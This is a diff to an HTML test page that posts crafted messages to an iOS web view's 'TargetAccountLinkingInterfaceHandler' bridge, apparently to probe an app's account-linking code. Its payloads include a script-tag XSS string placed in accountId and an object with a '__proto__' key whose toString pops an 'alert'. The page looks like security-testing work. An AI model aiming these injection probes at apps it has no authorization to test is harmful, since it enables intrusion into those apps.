@@ -30,40 +30,82 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Test TargetAccountLinkingInterfaceHandler</title>
+  <title>Test TargetAccountLinkingInterfaceHandler Payloads</title>
   <style>
-    button { margin: 6px; padding: 10px; font-size: 16px; }
-    body { font-family: sans-serif; background: #f0f0f0; padding: 20px; }
+    body { font-family: Arial, sans-serif; padding: 20px; background: #f4f4f4; }
+    button { margin: 10px 0; padding: 10px 15px; font-size: 16px; display: block; }
+    #log { background: #fff; padding: 10px; border: 1px solid #ccc; margin-top: 20px; }
   </style>
 </head>
 <body>
 
-<h2>Test TargetAccountLinkingInterfaceHandler</h2>
+  <h2>Test TargetAccountLinkingInterfaceHandler</h2>
 
-<button onclick="sendPayload(null)">Send: null</button><br>
-<button onclick="sendPayload({})">Send: {}</button><br>
-<button onclick="sendPayload({action: 'linkAccount'})">Send: linkAccount (بدون accountId)</button><br>
-<button onclick="sendPayload({action: 'linkAccount', accountId: '123'})">Send: linkAccount + accountId</button><br>
-<button onclick="sendPayload({action: 'testAction', foo: 'bar'})">Send: testAction + foo</button><br>
-<button onclick="sendPayload('<script>alert(1)</script>')">Send: <script>payload</script></button><br>
+  <button onclick="sendPayload(1)">1. OAuth-style payload (facebook)</button>
+  <button onclick="sendPayload(2)">2. Injection in accountId</button>
+  <button onclick="sendPayload(3)">3. Fake __proto__ crash test</button>
+  <button onclick="sendPayload(4)">4. Payload without 'action'</button>
 
-<hr>
-<div id="log" style="background:#fff; padding:10px; border:1px solid #ccc;"></div>
+  <div id="log"></div>
 
-<script>
-  function sendPayload(payload) {
-    try {
-      window.webkit.messageHandlers.TargetAccountLinkingInterfaceHandler.postMessage(payload);
-      log("✅ Sent: " + JSON.stringify(payload));
-    } catch (e) {
-      log("❌ Error: " + e.message);
+  <script>
+    function sendPayload(type) {
+      let payload;
+
+      switch (type) {
+        case 1:
+          payload = {
+            action: "linkAccount",
+            provider: "facebook",
+            accessToken: "dummy_token_123"
+          };
+          break;
+
+        case 2:
+          payload = {
+            action: "linkAccount",
+            accountId: "<script>alert(1)</script>"
+          };
+          break;
+
+        case 3:
+          payload = {
+            action: "linkAccount",
+            accountId: {
+              hack: "__proto__",
+              toString: function () {
+                alert("pwned");
+                return "1337";
+              }
+            }
+          };
+          break;
+
+        case 4:
+          payload = {
+            provider: "google",
+            token: "abcdef"
+          };
+          break;
+
+        default:
+          alert("Unknown payload type");
+          return;
+      }
+
+      try {
+        window.webkit.messageHandlers.TargetAccountLinkingInterfaceHandler.postMessage(payload);
+        log(`✅ Sent payload ${type}: ${JSON.stringify(payload)}`);
+      } catch (e) {
+        log(`❌ Error sending payload ${type}: ${e.message}`);
+      }
     }
-  }
 
-  function log(msg) {
-    document.getElementById("log").innerHTML += "<div>" + msg + "</div>";
-  }
-</script>
+    function log(message) {
+      const logDiv = document.getElementById("log");
+      logDiv.innerHTML += `<div>🟡 ${message}</div>`;
+    }
+  </script>
 
 </body>
 </html>
